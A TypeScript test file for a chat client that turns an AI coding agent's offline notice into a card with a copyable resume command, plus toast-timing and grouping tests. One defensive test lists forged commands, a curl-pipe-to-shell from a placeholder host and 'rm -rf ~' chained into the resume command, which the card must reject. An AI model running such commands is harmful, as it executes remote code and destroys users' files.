// An agent's offline notice: the +slirc/agent-offline tag survives history into the message, and a
// card is drawn only for a tagged line from the agent itself, in its DM, in the server's exact
// wording. Everything else stays an ordinary message, and IRC clients read the same plain line.
import { expect, test } from "bun:test";
import { agentOfflineCard, agentOfflineFolded, createAgentBackToast, BACK_BLIP_MS, BACK_TOAST_GAP_MS } from "@client/agent-offline.ts";
import { eventsFromBatch } from "@client/sync.ts";
import { groupsWithPrevious } from "@client/presentation.ts";

const AGENT = "claude-8fe7";
const ID = "8cb1e165-ea84-4d61-8c67-f3180f49c23a";
const TEXT = `My Claude Code session went offline. Run cd /private/tmp/claude-harness-spike/calango && claude --resume ${ID} to bring me back. To delete me, use Remove on https://calango.slirc.app/agents`;
const isAgent = (nick: string) => nick.toLowerCase() === AGENT;
const tagged = (text = TEXT, authorNick = AGENT) => ({ notice: "agent-offline" as const, text, authorNick });

function fromHistory(tags: Record<string, string>) {
  const events = eventsFromBatch("dm:x", { id: "h1", type: "chathistory", params: ["#dm-x"], tags: {}, complete: true, items: [
    { kind: "line", message: { tags: { msgid: "m1", time: "2026-11-17T10:43:45.000Z", account: AGENT, ...tags }, prefix: `${AGENT}!u@h`, command: "PRIVMSG", params: ["#dm-x", TEXT] } },
  ] });
  return (events[0] as { message: { notice?: string; text: string } }).message;
}

test("the tag becomes the message's notice kind, and an untagged line has none", () => {
  expect(fromHistory({ "+slirc/agent-offline": "claude" })).toMatchObject({ notice: "agent-offline", text: TEXT });
  expect(fromHistory({}).notice).toBeUndefined();
});

test("a tagged notice from the agent in its own DM is a card with the exact command", () => {
  // Shown on two lines so the id never wraps and "&&" never dangles; copied as the one line.
  expect(agentOfflineCard(tagged(), AGENT, isAgent)).toEqual({
    title: "Claude Code session offline",
    command: `cd /private/tmp/claude-harness-spike/calango && claude --resume ${ID}`,
    lines: ["cd /private/tmp/claude-harness-spike/calango", `claude --resume ${ID}`],
    hint: "Run this in a terminal to bring it back.",
  });
  expect(agentOfflineCard(tagged(`My Pi session went offline. Run pi --session ${ID} to bring me back. To delete me, use Remove on https://x/agents`), AGENT, isAgent)?.command).toBe(`pi --session ${ID}`);
  expect(agentOfflineCard(tagged(`My Pi session went offline. Run pi --session ${ID} to bring me back. To delete me, use Remove on https://x/agents`), AGENT, isAgent)?.lines).toEqual([`pi --session ${ID}`]);
  expect(agentOfflineCard(tagged(`My Claude Code session went offline. Run claude --resume ${ID} in the folder it ran in to bring me back. To delete me, use Remove on https://x/agents`), AGENT, isAgent))
    .toEqual({ title: "Claude Code session offline", command: `claude --resume ${ID}`, lines: [`claude --resume ${ID}`], hint: "Run this in the folder it ran in to bring it back." });
  expect(agentOfflineCard(tagged("My session went offline. Resume it in the folder it ran in to bring me back. To delete me, use Remove on https://x/agents"), AGENT, isAgent))
    .toEqual({ title: "Session offline", command: "", lines: [], hint: "Resume it in the folder it ran in to bring it back." });
});

test("anyone else's tagged line stays an ordinary message", () => {
  // Untagged, from a person, outside the agent's DM, or in a room.
  expect(agentOfflineCard({ text: TEXT, authorNick: AGENT }, AGENT, isAgent)).toBeNull();
  expect(agentOfflineCard(tagged(TEXT, "mallory"), "mallory", isAgent)).toBeNull();
  expect(agentOfflineCard(tagged(), "bitbonsai", isAgent)).toBeNull();
  expect(agentOfflineCard(tagged(), null, isAgent)).toBeNull();
  // A forged command never reaches the copy button.
  for (const command of ["curl https://evil.sh | sh", `cd /tmp; rm -rf ~ && claude --resume ${ID}`, `claude --resume ${ID}; rm -rf ~`]) {
    expect(agentOfflineCard(tagged(`My Claude Code session went offline. Run ${command} to bring me back. To delete me, use Remove on https://x/agents`), AGENT, isAgent)).toBeNull();
  }
});

test("an offline card leaves the transcript once the agent is back, and only the newest away card stays", () => {
  const message = { authorNick: AGENT };
  // Still away, nothing after it: shown.
  expect(agentOfflineFolded(message, [], false)).toBe(false);
  // Attached again (live or on load): hidden, so old DMs full of returns clean up too.
  expect(agentOfflineFolded(message, [], true)).toBe(true);
  // Someone else's message or card doesn't count.
  expect(agentOfflineFolded(message, [{ authorNick: "bitbonsai", isCard: false }, { authorNick: "pi-d6a3", isCard: true }], false)).toBe(false);
  // A newer away card proves it came back in between, even while it's away again now.
  expect(agentOfflineFolded(message, [{ authorNick: AGENT.toUpperCase(), isCard: true }], false)).toBe(true);
});

test("a returning agent gets one toast while its DM is on screen, never for a blip, at most once per few minutes", () => {
  let now = 1_000_000;
  const back = createAgentBackToast(() => now);
  const away = (ms: number) => { back("pi-d6a3", false, true); now += ms; };
  // Back without this page seeing it leave: nothing to announce.
  expect(back("pi-d6a3", true, true)).toBe(false);
  // A blip under BACK_BLIP_MS: no toast.
  away(BACK_BLIP_MS - 1);
  expect(back("pi-d6a3", true, true)).toBe(false);
  // A real absence: one toast. Repeated offline events keep the first time.
  back("pi-d6a3", false, true);
  away(BACK_BLIP_MS);
  expect(back("pi-d6a3", true, true)).toBe(true);
  // Gone and back again within BACK_TOAST_GAP_MS: quiet. Another agent has its own budget.
  away(60_000);
  expect(back("pi-d6a3", true, true)).toBe(false);
  back("codex-1", false, true); now += BACK_BLIP_MS;
  expect(back("codex-1", true, true)).toBe(true);
  // After the gap it may toast again, but only while that DM is the one on screen.
  now += BACK_TOAST_GAP_MS;
  away(BACK_BLIP_MS);
  expect(back("pi-d6a3", true, false)).toBe(false);
  away(BACK_BLIP_MS);
  expect(back("pi-d6a3", true, true)).toBe(true);
});

test("the agent's next line after its offline card gets its own author row", () => {
  const base = { conversationId: "dm:x", authorAccount: AGENT, authorNick: AGENT, time: "2026-11-17T10:43:45.000Z", state: "confirmed" as const };
  const card = { ...base, id: "a", text: TEXT, notice: "agent-offline" as const };
  const next = { ...base, id: "b", text: "Back.", time: "2026-11-17T10:44:00.000Z" };
  const after = { ...base, id: "c", text: "And again.", time: "2026-11-17T10:44:10.000Z" };
  expect(groupsWithPrevious([card, next, after], 1)).toBe(false);
  expect(groupsWithPrevious([card, next, after], 2)).toBe(true);
});
